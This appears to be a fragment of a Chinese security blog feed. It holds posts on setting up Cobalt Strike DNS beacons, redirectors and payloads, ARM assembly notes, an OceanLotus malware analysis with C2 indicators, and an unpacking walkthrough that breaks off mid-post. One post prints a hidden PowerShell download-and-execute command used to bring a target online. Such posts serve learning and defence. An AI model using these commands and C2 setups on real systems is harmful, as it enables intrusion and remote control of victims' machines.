        <content type="html"><![CDATA[<h2 id="Cobalt-Strike-DNS-Beacon的使用与原理"><a href="#Cobalt-Strike-DNS-Beacon的使用与原理" class="headerlink" title="Cobalt Strike DNS Beacon的使用与原理"></a>Cobalt Strike DNS Beacon的使用与原理</h2><p>这一节实验需要有一台公网vps和一个域名</p><span id="more"></span><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><ol><li><p>dns木马</p><p>dns木马因为隐蔽性较好，在受害者不会开放任何端口可以规避防火墙协议，走的是53端口 (服务器)，防火墙不会拦截，缺点响应较慢。</p></li></ol><h3 id="1-部署域名解析"><a href="#1-部署域名解析" class="headerlink" title="1. 部署域名解析"></a>1. 部署域名解析</h3><ol><li><p>配置域名解析：需要添加一条A记录和一条NS记录</p><ul><li><p>A：告诉域名服务器，test.xiao（域名）指向的IP地址是多少</p></li><li><p>CN：告诉域名服务器，想要知道c1.xiao（域名）的IP就去问test.xiao（域名）</p><img src="/2021/05/26/Cobalt-Strike-%E4%B8%89/image-20210531115933586.png" class="" title="image-20210531115933586"></li></ul><ol start="2"><li>设置完成后验证一下A记录是否解析成功</li></ol><p>找一台可以联网的主机输入<code>ping test.xiao（域名）</code>：可以显示IP地址说明解析已经成功了</p><img src="/2021/05/26/Cobalt-Strike-%E4%B8%89/image-20210531120351278.png" class="" title="image-20210531120351278"><ol start="3"><li>然后在vps开启53端口并监听试试测试CN记录是否解析成功</li></ol><ul><li>开启端口命令</li></ul><p><code>iptables -I INPUT -p tcp --dport 53 -j ACCEPT</code></p><img src="/2021/05/26/Cobalt-Strike-%E4%B8%89/image-20210526175044533.png" class="" title="image-20210526175044533"><ul><li><p>监听端口命令</p><p><code>tcpdump -n -i any udp dst port 53</code></p><ul><li>然后在一台可以联网的主机上执行<code>nslookup c1.xiao（域名）</code>可以看到解析成功</li></ul><img src="/2021/05/26/Cobalt-Strike-%E4%B8%89/image-20210531120506743.png" class="" title="image-20210531120506743"></li></ul></li></ol><h3 id="2-新建监听器"><a href="#2-新建监听器" class="headerlink" title="2. 新建监听器"></a>2. 新建监听器</h3><ol><li><p>开启cs：HOST输入我们配置好的域名</p><img src="/2021/05/26/Cobalt-Strike-%E4%B8%89/image-20210531120536410.png" class="" title="image-20210531120536410"><ol start="2"><li>新建一个监听器</li></ol><img src="/2021/05/26/Cobalt-Strike-%E4%B8%89/image-20210531120623036.png" class="" title="image-20210531120623036"></li></ol><h3 id="3-生成DNS木马"><a href="#3-生成DNS木马" class="headerlink" title="3. 生成DNS木马"></a>3. 生成DNS木马</h3><img src="/2021/05/26/Cobalt-Strike-%E4%B8%89/image-20210526181524794.png" class="" title="image-20210526181524794"><img src="/2021/05/26/Cobalt-Strike-%E4%B8%89/image-20210526181617435.png" class="" title="image-20210526181617435"><h3 id="4-上线"><a href="#4-上线" class="headerlink" title="4. 上线"></a>4. 上线</h3><ol><li><p>将生成的木马在目标机上执行</p><img src="/2021/05/26/Cobalt-Strike-%E4%B8%89/image-20210526181844019.png" class="" title="image-20210526181844019"><ol start="2"><li>可以看到已经上线</li></ol><img src="/2021/05/26/Cobalt-Strike-%E4%B8%89/image-20210526181935501.png" class="" title="image-20210526181935501"><ol start="3"><li>在目标机上右键打开beacon窗口输入命令，过一会儿就可以看到主机的详细信息</li></ol><p><code>checkin</code></p><img src="/2021/05/26/Cobalt-Strike-%E4%B8%89/image-20210526182137564.png" class="" title="image-20210526182137564"><img src="/2021/05/26/Cobalt-Strike-%E4%B8%89/image-20210526182646285.png" class="" title="image-20210526182646285"></li></ol>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -Cobalt Strike </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobalt Strike(二)</title>
      <link href="/2021/05/25/Cobalt-Strike-%E4%BA%8C/"/>
      <url>/2021/05/25/Cobalt-Strike-%E4%BA%8C/</url>
      
        <content type="html"><![CDATA[<h2 id="Cobalt-Strike重定器"><a href="#Cobalt-Strike重定器" class="headerlink" title="Cobalt Strike重定器"></a>Cobalt Strike重定器</h2><p>域名：kali123.com</p><p>dns服务器 ：192.168.3.40</p><p>csserver(kali)：192.168.3.8k.kali.com</p><p>Ubuntu：192.168.3.42</p><span id="more"></span><h3 id="简介："><a href="#简介：" class="headerlink" title="简介："></a>简介：</h3><ol><li><p>什么是“重定器”：</p><p>“重定器”是一个在“CS”服务器和目标网络之间的服务器。作用是对你团队服务器下的连接，用做代理服务器或端口转发服务。</p></li><li><p>作用</p><pre><code> 1. 保护服务器地址 2. 增强适应能力，保持通信</code></pre></li><li><p>使用的工具</p><p><code>socat TCP4-LISTEN:80，fork TCP4:[team server]:80</code></p><p>可以用这个工具来建立80端口的连接管理，并且继续在80端口运行那个连接团队服务器的连接。</p><p>linux系统的使用命令</p><p><code>socat TCP4-LISTEN:80,fork TCP4:team.cskali.com:80</code></p></li></ol><p>重定向拓扑图</p><img src="/2021/05/25/Cobalt-Strike-%E4%BA%8C/image-20210525172341978.png" class="" title="image-20210525172341978"><ol start="4"><li><p>本地域名配置</p><p>​先配置一下DNS信息</p><img src="/2021/05/25/Cobalt-Strike-%E4%BA%8C/image-20210525201436816.png" class="" title="image-20210525201436816"><p>​然后在我们用我们的windows虚拟机输入域名连接一下csserver</p><p>​a. 修改本地的DNS</p><img src="/2021/05/25/Cobalt-Strike-%E4%BA%8C/image-20210525201836804.png" class="" title="image-20210525201836804"><p>​b. 连接csserver：连接成功</p><img src="/2021/05/25/Cobalt-Strike-%E4%BA%8C/image-20210525201946554.png" class="" title="image-20210525201946554"></li><li><p>在重定向服务器上使用socat工具进行重定向</p><img src="/2021/05/25/Cobalt-Strike-%E4%BA%8C/image-20210525224849860.png" class="" title="image-20210525224849860"></li><li><p>上线后监控靶机的流量可以看到都是流向重定向服务器的流量说明建立连接并中专成功</p><img src="/2021/05/25/Cobalt-Strike-%E4%BA%8C/image-20210525230254333.png" class="" title="image-20210525230254333"><img src="/2021/05/25/Cobalt-Strike-%E4%BA%8C/image-20210525230127596.png" class="" title="image-20210525230127596"></li></ol>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -Cobalt Strike </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobalt Strike使用（一）</title>
      <link href="/2021/05/24/Cobalt-Strike%E4%BD%BF%E7%94%A8%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2021/05/24/Cobalt-Strike%E4%BD%BF%E7%94%A8%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><h3 id="简介："><a href="#简介：" class="headerlink" title="简介："></a>简介：</h3><p>​Cobalt Strike作为一款GUI的框架式渗透工具，集成了端口转发、服务扫描、自动化溢出、多模式端口监听、exe\dll\java木马生成、office宏病毒生成、木马捆绑；钓鱼攻击包括：站点克隆、目标信息获取、java执行、浏览器自动攻击等等。</p><span id="more"></span><h3 id="运行环境："><a href="#运行环境：" class="headerlink" title="运行环境："></a>运行环境：</h3><p>​Cobalt Strike4.3</p><p>​首先安装使用前需要安装java环境jre</p><p>​服务器：kali 或者 Debian会比较好，Ubuntu的话可能会有些端口占用的问题需要处理</p><p>​客户端：安装jre即可使用（跨平台）</p><h3 id="启动："><a href="#启动：" class="headerlink" title="启动："></a>启动：</h3><h4 id="1-创建服务器"><a href="#1-创建服务器" class="headerlink" title="1. 创建服务器"></a>1. 创建服务器</h4><p>​<code>./teamserver &lt;host&gt; &lt;password&gt; [/path/to/c2.profile] [YYYY-MM-DD]</code></p><p>​<host> is the (default) IP address of this Cobalt Strike team server<br>​<password> is the shared password to connect to this server<br>​[/path/to/c2.profile] is your Malleable C2 profile<br>​[YYYY-MM-DD] is a kill date for Beacon payloads run from this server</password></host></p><img src="/2021/05/24/Cobalt-Strike%E4%BD%BF%E7%94%A8%EF%BC%88%E4%B8%80%EF%BC%89/image-20210524214346922.png" class="" title="image-20210524214346922"><h4 id="2-客户端连接"><a href="#2-客户端连接" class="headerlink" title="2. 客户端连接"></a>2. 客户端连接</h4><ul><li>linux启动方式</li></ul><p><code>./cobaltstrike</code></p><img src="/2021/05/24/Cobalt-Strike%E4%BD%BF%E7%94%A8%EF%BC%88%E4%B8%80%EF%BC%89/image-20210524214809083.png" class="" title="image-20210524214809083"><ul><li>Windows启动方式</li></ul><img src="/2021/05/24/Cobalt-Strike%E4%BD%BF%E7%94%A8%EF%BC%88%E4%B8%80%EF%BC%89/image-20210525144617108.png" class="" title="image-20210525144617108"><p>​设置好同一个server端IP之后客户端之间可以在Event Log窗口聊天通信</p><p>​<img src="/2021/05/24/Cobalt-Strike%E4%BD%BF%E7%94%A8%EF%BC%88%E4%B8%80%EF%BC%89/image-20210525150508853.png" class="" title="image-20210525150508853"></p><h4 id="3-让目标连接上teamserver"><a href="#3-让目标连接上teamserver" class="headerlink" title="3. 让目标连接上teamserver"></a>3. 让目标连接上teamserver</h4><p>3.1. 设置监听器</p><img src="/2021/05/24/Cobalt-Strike%E4%BD%BF%E7%94%A8%EF%BC%88%E4%B8%80%EF%BC%89/image-20210525151153511.png" class="" title="image-20210525151153511"><p>3.2. 生成攻击载荷</p><p>​在这里选择给我们的监听器添加一个攻击载荷</p><p>​<img src="/2021/05/24/Cobalt-Strike%E4%BD%BF%E7%94%A8%EF%BC%88%E4%B8%80%EF%BC%89/image-20210525151352591.png" class="" title="image-20210525151352591"></p><img src="/2021/05/24/Cobalt-Strike%E4%BD%BF%E7%94%A8%EF%BC%88%E4%B8%80%EF%BC%89/image-20210525152525524.png" class="" title="image-20210525152525524"><p>​添加在和成功之后会有一个弹窗：我们保存这个弹窗中的powershell命令</p><img src="/2021/05/24/Cobalt-Strike%E4%BD%BF%E7%94%A8%EF%BC%88%E4%B8%80%EF%BC%89/image-20210525152627340.png" class="" title="image-20210525152627340"><p>​<code>powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.3.8:80/b'))"</code></p><p>​我们可以看到这个powershell命令的作用是从连接处下载内容并以隐藏的方式执行</p><p>3.3. 在目标机上运行</p><p>​在目标机让命令行运行这段powershell命令可以看到目标机上线</p><img src="/2021/05/24/Cobalt-Strike%E4%BD%BF%E7%94%A8%EF%BC%88%E4%B8%80%EF%BC%89/image-20210525154736503.png" class="" title="image-20210525154736503">]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -Cobalt Strike </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ARM汇编笔记</title>
      <link href="/2021/05/24/ARM%E6%B1%87%E7%BC%96%E7%AC%94%E8%AE%B0/"/>
      <url>/2021/05/24/ARM%E6%B1%87%E7%BC%96%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="ARM汇编的一些知识"><a href="#ARM汇编的一些知识" class="headerlink" title="ARM汇编的一些知识"></a>ARM汇编的一些知识</h2><h3 id="寄存器数量"><a href="#寄存器数量" class="headerlink" title="寄存器数量"></a>寄存器数量</h3><p>ARM处理器一共有37个32位寄存器。<br>30个为“通用“寄存器： r0-r14<br>未分组：r0-r7，即只有一个寄存器<br>分 组：r8-r14，即有多个同名寄存器<br>r8-r12 ：两个<br>r13-r14：6个 r13(sp),R14(lr)<br>1个固定的程序计数器 ： pc (又称r15)<br>6个为状态寄存器 ： cpsr spsr<br>不能被同时访问,一种模式下最多同时访问18个寄存器</p><span id="more"></span><h3 id="不同模式下访问的寄存器"><a href="#不同模式下访问的寄存器" class="headerlink" title="不同模式下访问的寄存器"></a>不同模式下访问的寄存器</h3><img src="/2021/05/24/ARM%E6%B1%87%E7%BC%96%E7%AC%94%E8%AE%B0/dec5072d-4029-4f77-ba02-4db3edea2f3a.png" class="" title="img"><h3 id="寄存器用途"><a href="#寄存器用途" class="headerlink" title="寄存器用途"></a>寄存器用途</h3><p>sp(r13) - 堆栈指针<br>lr(r14) - 连接寄存器<br>调用子程序时存放调用地址,存放返回地址<br>pc(r15) - 程序计数器,相当于windows的EIP<br>(1)跳转到指定地址<br>mov pc,lr// 直接修改pc ，完成跳转<br>bx lr // 跳转到 lr保存的地址</p><p>(2)在函数入口保存寄存器信息<br>stmfd sp!, {r11,lr} // 保存大括号中的寄存器到栈中，从右往左</p><p>(3)使用ldm指令修改pc,完成函数返回<br>ldmfd sp!, {r11,pc} // 将栈中数据依次加载到寄存器中，从左往右</p><p>cpsr – 当前程序状态寄存器<br>spsr–备份的程序状态寄存器</p><h3 id="条件执行后缀"><a href="#条件执行后缀" class="headerlink" title="条件执行后缀"></a>条件执行后缀</h3><img src="/2021/05/24/ARM%E6%B1%87%E7%BC%96%E7%AC%94%E8%AE%B0/976cd38d-47ac-4158-b029-2d8df50def19.png" class="" title="img"><h3 id="ARM的指令流水线"><a href="#ARM的指令流水线" class="headerlink" title="ARM的指令流水线"></a>ARM的指令流水线</h3><img src="/2021/05/24/ARM%E6%B1%87%E7%BC%96%E7%AC%94%E8%AE%B0/06750ce2-c439-4dc2-97f1-676ed097cef4.png" class="" title="img"><p>ARM指令 当前执行的PC和与看到的PC相差8<br>即 看汇编时，需要 pc+8 才是真正的pc</p>]]></content>
      
      
      <categories>
          
          <category> ARM汇编 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 寄存器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ocean Lotus样本分析</title>
      <link href="/2021/05/24/Ocean-Lotus%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
      <url>/2021/05/24/Ocean-Lotus%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00样本简介"><a href="#0x00样本简介" class="headerlink" title="0x00样本简介"></a>0x00样本简介</h2><p>​    该样本是2018年5月份国内某安全厂商威胁情报系统捕获的一起针对中国及其他东亚地区国家政府、科研单位领域的攻击样本，该APT组织确认为APT-32（海莲花OceanLotus）。<br>​    此次攻击载体选用的是.doc后缀的rtf文件，该rtf文件通过利用漏洞CVE-2017-11882释放恶意文件到本地并加载执行。其释放文件利用了白加黑的组合加载手法逃避杀软的查杀，在运行过程中并无我们常见的多级注入行为，也并没有文件落地，具有较强的隐蔽性。原始样本信息如表１所示。</p><table><thead><tr><th>文件名称</th><th>Document_GPI Invitation-UNSOOC China.doc</th></tr></thead><tbody><tr><td>Md5</td><td>02ae075da4fb2a6d38ce06f8f40e397e</td></tr><tr><td>文件类型</td><td>Rtf</td></tr></tbody></table><center>表1</center><span id="more"></span><h2 id="0x01攻击流程"><a href="#0x01攻击流程" class="headerlink" title="0x01攻击流程"></a>0x01攻击流程</h2><p>该样本首先通过利用Office公式编辑器模块在解析公式名时候出现的栈溢出漏洞CVE-2017-11882释放三个文件（MicrosoftWindowsDiskDiagnosticResolver.exe，rastls.dll和OUTLFLTR.DAT）到本地临时目录，然后执行释放的PE文件。MicrosoftWindowsDiskDiagnosticResolver.exe是一个拥有合法签名的PE文件，该PE文件运行期间会加载rastls.dll（注意系统目录下也有一个同名DLL）。rastls.dll模块DllMain会将宿主PE的代码段内容进行CSP加密混淆，并且会hook代码段后续一个位置，劫持EIP至DLL里面的函数，继而加载OUTLFLTR.DAT。然后从OUTLFLTR.DAT解密出shellcode1，跳转执行shellcode1.后续将.DAT文件解密变形出多个DLL文件，这些内存中的DLL文件将导入网络功能、注册表功能等所需的系统资源DLL。最终将执行其窃密、远控等恶意功能。其运行流程如下图所示。</p><img src="/2021/05/24/Ocean-Lotus%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/1.png" class="" title="img"><center>图1 样本执行流程</center><h2 id="0x02详细分析"><a href="#0x02详细分析" class="headerlink" title="0x02详细分析"></a>0x02详细分析</h2><p>漏洞部分该报告不分析，我们直接分析其释放文件。</p><p>MicrosoftWindowsDiskDiagnosticResolver.exe是一个白签名文件（如图2所示），我们从rastls.dll着手分析。调试器挂载MicrosoftWindowsDiskDiagnosticResolver.exe，跟进rastls.dll模块，结合IDA反汇编可以快速跟踪到对宿主代码段加密部分（图3）。</p><img src="/2021/05/24/Ocean-Lotus%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/2.png" class="" title="img"><center>图2 文件签名信息和VT检测信息</center><img src="/2021/05/24/Ocean-Lotus%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/3.png" class="" title="img"><center>图3 对宿主PE.text段加密混淆</center><p>然后修改0x40c19b处的代码为call sub_6e771ed0。</p><img src="/2021/05/24/Ocean-Lotus%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/4.png" class="" title="img"><center>图4 劫持宿主EIP</center><p>sub_6e771ed0是rastls.dll中的函数，IDA可观察到明显的文件操作行为。</p><img src="/2021/05/24/Ocean-Lotus%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/5.png" class="" title="img"><center>图5 sub_6e771ed0函数（图中偏移0x1ED0即sub_10001ED0）</center><p>在sub_6e771ed0内部下断或下断文件操作相关API，可跟踪到程序调用CreateFileW加载OUTLFLTR.DAT文件（图6）</p><img src="/2021/05/24/Ocean-Lotus%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/6.png" class="" title="img"><center>图6 加载OUTLFLTR.DAT</center><p>随后将在OUTLFLTR.DAT文件中提取处指定位置资源解析出相应的shellcode1（图7），并跳转执行shellcode（图8）。</p><img src="/2021/05/24/Ocean-Lotus%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/7.png" class="" title="img"><center>图7 解密提取shellcode</center><img src="/2021/05/24/Ocean-Lotus%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/8.png" class="" title="img"><center>图8 跳转到对缓冲区的shellcode执行</center><p>Shellcode1中继续从提取的资源中解密出第一个动态链接库文件，名为{92BA1818-0119-4F79-874E-E3BF79C355B8}.dll。跳转到经PE解析得到的该DLL的OEP位置。DLLMain函数并无特殊功能，其提供的大量局部函数片段将服务shellocde。</p><img src="/2021/05/24/Ocean-Lotus%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/9.png" class="" title="img"><center>图9 找到第一个DLL资源（{92BA1818-0119-4F79-874E-E3BF79C355B8}.dll）</center><img src="/2021/05/24/Ocean-Lotus%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/10.png" class="" title="img"><center>图10 修复IAT之后跳入{92BA1818-0119-4F79-874E-E3BF79C355B8}.dll OEP</center><p>此时我们Dump出修复之后的DLL文件（可对VirtualProtect下断快速找到堆区的DLL文件）。修改Dump文件的文件对齐即各区段偏移之后，直接IDA反汇编以辅助我们动态跟踪。</p><img src="/2021/05/24/Ocean-Lotus%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/11.png" class="" title="img"><center>图10 IDA反汇编中找到的DLL签名信息</center><p>执行完{92BA1818-0119-4F79-874E-E3BF79C355B8}.dll DllEntry之后，返回至shellcode1，后续将调用{92BA1818-0119-4F79-874E-E3BF79C355B8}.dll中的构造好的代码片段寻找第二个DLL资源。</p><img src="/2021/05/24/Ocean-Lotus%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/11.png" class="" title="img"><center>图11 寻找第二个DLL资源</center><p>找到第二个DLL之后，程序流会解密出第二段shellcode2，跳转执行shellcode2，然后修复找到的DLL，跳转到新的DLL OEP。</p><img src="/2021/05/24/Ocean-Lotus%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/12.png" class="" title="img"><center>图12 解密出shellcode2，跳转执行</center><img src="/2021/05/24/Ocean-Lotus%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/13.png" class="" title="img"><center>图13 跳入修复后的DLL（{A96B020F-0000-466F-A96D-A91BBF8EAC96}.dll）</center><img src="/2021/05/24/Ocean-Lotus%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/14.png" class="" title="img"><center>图14 {A96B020F-0000-466F-A96D-A91BBF8EAC96}.dll签名信息</center><p>{A96B020F-0000-466F-A96D-A91BBF8EAC96}.dll与第一个DLL类似，其DllEntry无特别作用，但是它提供了针对源资源的解密方法，后续的程序流程中将调用揭秘方法解密出敏感信息（如网络相关的CC）。此外该DLL将会继续解密提取出三个网络相关的动态链接库文件。</p><img src="/2021/05/24/Ocean-Lotus%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/14.1.png" class="" title="img"><center>图14 位于{A96B020F-0000-466F-A96D-A91BBF8EAC96}.dll内的资源解密函数</center><p>继续解密修复第三个DLL资源。</p><img src="/2021/05/24/Ocean-Lotus%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/15.png" class="" title="img"><center>图15 解密出的第三个DLL（HttpProv.dll）</center><img src="/2021/05/24/Ocean-Lotus%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/16.png" class="" title="img"><center>图16 HttpProv.dll签名信息</center><p>HttpProv.dll提供了一个重要的导出函数CreateInstance。</p><img src="/2021/05/24/Ocean-Lotus%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/17.png" class="" title="img"><center>图17 HttpProv.dll-&gt;CreateInstance</center><img src="/2021/05/24/Ocean-Lotus%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/18.png" class="" title="img"><center>图18 创建新的线程</center><p>解密出第四个DLL资源。</p><img src="/2021/05/24/Ocean-Lotus%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/19.png" class="" title="img"><center>图19 跳转执行DnsProvider.dll OEP</center><img src="/2021/05/24/Ocean-Lotus%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/20.png" class="" title="img"><center>图20 DnsProvider.dll签名信息</center><p>设置图标资源相关的注册表值选用REG_OPTION_NON_VOLATILE方式，即只在内存中有效，无实际注册表修改。猜测这应该也是一种隐蔽自身的手段。</p><img src="/2021/05/24/Ocean-Lotus%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/21.png" class="" title="img"><center>图21 注册表设置</center><p>解密出最后一个DLL资源。</p><img src="/2021/05/24/Ocean-Lotus%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/22.png" class="" title="img"><center>图22 HttpProv.dll</center><img src="/2021/05/24/Ocean-Lotus%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/23.png" class="" title="img"><center>图23 HttpProv.dll签名信息</center><p>解密出的这些DLL文件在其初始化过程中将会载入网络模块相关系统资源，然后将进行本地数据上传、远程CC连接等行为。</p><img src="/2021/05/24/Ocean-Lotus%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/24.png" class="" title="img"><center>图24我们待资源解密之后提取的敏感信息</center><img src="/2021/05/24/Ocean-Lotus%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/25.png" class="" title="img"><center>图25 远程CC服务器连接</center><img src="/2021/05/24/Ocean-Lotus%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/26.png" class="" title="img"><center>图26 将本地用户信息加密之后上传</center><img src="/2021/05/24/Ocean-Lotus%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/27.png" class="" title="img"><center>图27 远程域名请求行为</center><h2 id="0x03-IOC"><a href="#0x03-IOC" class="headerlink" title="0x03 IOC"></a>0x03 IOC</h2><p>网络C2</p><table><thead><tr><th>回连域名</th><th>andreagahuvrauvin.comstraliaenollma.xyzbyronorenstein.com</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p>释放文件及中间件哈希</p><table><thead><tr><th>文件名</th><th>MD5</th></tr></thead><tbody><tr><td>MicrosoftWindowsDiskDiagnosticResolver.exe</td><td>62944e26b36b1dcace429ae26ba66164</td></tr><tr><td>OUTLFLTR.DAT</td><td>b10f93cdbcdf43d4c5c5770872e239f4</td></tr><tr><td>rastls.dll</td><td>f775cc387a55831386e44dd00ef9723e</td></tr><tr><td>{92BA1818-0119-4F79-874E-E3BF79C355B8}.dll</td><td>93b6996fe1f5a91400b76f4a56f56a0c</td></tr><tr><td>{A96B020F-0000-466F-A96D-A91BBF8EAC96}.dll</td><td>76a4d8da378ad191e3d93d210c217e59</td></tr><tr><td>HttpProv.dll</td><td>b8df4f077f900878871dddea14774bc5</td></tr><tr><td>DnsProvider.dll</td><td>a5ad1094870ffaa5129b51a840d497cd</td></tr><tr><td>HttpProv.dll</td><td>c2941048fa90d98147e8f0790b708657</td></tr></tbody></table><h2 id="0x04总结"><a href="#0x04总结" class="headerlink" title="0x04总结"></a>0x04总结</h2><p>此次捕获的由APT组织海莲花针对我国发起的攻击活动的高危情报，该样本选用伪装成doc文件的RTF文档作为攻击载体，利用了常见的栈溢出漏洞CVE-2017-11882，当用户打开后缀为.doc的文档时，若没有更新该漏洞补丁则会触发漏洞释放内嵌的资源文件到本地。释放文件采用了白利用技术绕过常规杀软检测，在木马运行过程中无文件落地并且也没有进行常规木马的可信进程注入行为。解析的shellcode存在较多的加密混淆操作，后续的窃密远控行为分为多线程执行，其执行流程在内存中解密出的多模块间跳转，这些操作一定程度上加大了逆向分析难度。总结来说，该样本具有较强的隐蔽性，较高的稳定性，其蓄谋攻击可见一斑。</p>]]></content>
      
      
      <categories>
          
          <category> 样本分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows木马 </tag>
            
            <tag> OceanLotus </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一枚简单的未知壳</title>
      <link href="/2021/05/24/%E4%B8%80%E6%9E%9A%E7%AE%80%E5%8D%95%E7%9A%84%E6%9C%AA%E7%9F%A5%E5%A3%B3/"/>
      <url>/2021/05/24/%E4%B8%80%E6%9E%9A%E7%AE%80%E5%8D%95%E7%9A%84%E6%9C%AA%E7%9F%A5%E5%A3%B3/</url>
      
        <content type="html"><![CDATA[<h3 id="工具-amp-环境"><a href="#工具-amp-环境" class="headerlink" title="工具&amp;环境:"></a>工具&amp;环境:</h3><table><thead><tr><th align="left">工具</th><th>系统环境</th></tr></thead><tbody><tr><td align="left">PEID</td><td>win7_x86</td></tr><tr><td align="left">OD</td><td></td></tr><tr><td align="left">IDA</td><td></td></tr><tr><td align="left">imporREC</td><td></td></tr></tbody></table><h3 id="查壳"><a href="#查壳" class="headerlink" title="查壳"></a>查壳</h3><p>先用PEID扫了一下发现什么都没有扫到<br> <img src="/2021/05/24/%E4%B8%80%E6%9E%9A%E7%AE%80%E5%8D%95%E7%9A%84%E6%9C%AA%E7%9F%A5%E5%A3%B3/623a1200-5054-432b-9613-8ceb28562e82.jpg" class="" title="img"></p><span id="more"></span><h3 id="直接先用OD打开看一下"><a href="#直接先用OD打开看一下" class="headerlink" title="直接先用OD打开看一下"></a>直接先用OD打开看一下</h3><p>发现有pushad/fd先用ESP定律下断试一下<br> <img src="/2021/05/24/%E4%B8%80%E6%9E%9A%E7%AE%80%E5%8D%95%E7%9A%84%E6%9C%AA%E7%9F%A5%E5%A3%B3/1a8bec0d-3c8f-4a42-9dfc-fe11ac4d4c4b.png" class="" title="img"></p><p>嗯,直接就这样到了,F7几下就到了OEP<br> <img src="/2021/05/24/%E4%B8%80%E6%9E%9A%E7%AE%80%E5%8D%95%E7%9A%84%E6%9C%AA%E7%9F%A5%E5%A3%B3/b7135dff-2520-480a-a78e-aa78ced4f978.png" class="" title="img"></p><p>这里有个sub esp,0x58所以应该是Delphi写的,第一个call本来应该显示getversion的,但是并没有,发现它IAT加密了<br> <strong>OEP是47148B</strong><br> <img src="/2021/05/24/%E4%B8%80%E6%9E%9A%E7%AE%80%E5%8D%95%E7%9A%84%E6%9C%AA%E7%9F%A5%E5%A3%B3/5ad9befa-e19c-4abc-bd97-b797a6eab5d7.png" class="" title="img"></p><p>那我们先跟进去看一下</p><p>这里有对ebx一个sub和add运算看了一下发现它获取到了GetVersion的地址<br> <img src="/2021/05/24/%E4%B8%80%E6%9E%9A%E7%AE%80%E5%8D%95%E7%9A%84%E6%9C%AA%E7%9F%A5%E5%A3%B3/e9bfd6e4-da02-45b2-a55c-01a8255ace15.png" class="" title="img"></p><p>但是0x475080还是它WriteIAT的地址,所以在这里下硬件写入断点,然后重新运行寻找它GetAPI的地方<br> <img src="/2021/05/24/%E4%B8%80%E6%9E%9A%E7%AE%80%E5%8D%95%E7%9A%84%E6%9C%AA%E7%9F%A5%E5%A3%B3/0d728ff3-108c-4eb6-893b-03cff517cce4.png" class="" title="img"></p><p>F9了两次发现这个地方像是写入IAT的地方<br> <img src="/2021/05/24/%E4%B8%80%E6%9E%9A%E7%AE%80%E5%8D%95%E7%9A%84%E6%9C%AA%E7%9F%A5%E5%A3%B3/9a384b9c-9fd8-46b7-aaa1-50feca86de32.png" class="" title="img"><br> <strong>那这个1D0897应该是WriteIATAddr了</strong></p><p>在0x2F0895这个地方下断用run跟踪F7跑一下<br> <img src="/2021/05/24/%E4%B8%80%E6%9E%9A%E7%AE%80%E5%8D%95%E7%9A%84%E6%9C%AA%E7%9F%A5%E5%A3%B3/0.2970275629542105.png" class="" title="img"></p><p><strong>run跟踪的原理就是模拟操作然后全部记录在run跟踪窗口中</strong><br> <img src="/2021/05/24/%E4%B8%80%E6%9E%9A%E7%AE%80%E5%8D%95%E7%9A%84%E6%9C%AA%E7%9F%A5%E5%A3%B3/0.8923110284070546.png" class="" title="img"></p><p>在写入iat的地方下断点,然后run跟踪,运行到下一次写入的时候就会断下来,<br> <img src="/2021/05/24/%E4%B8%80%E6%9E%9A%E7%AE%80%E5%8D%95%E7%9A%84%E6%9C%AA%E7%9F%A5%E5%A3%B3/31d0751c-1485-47a0-83c3-c72f0cf354cb.png" class="" 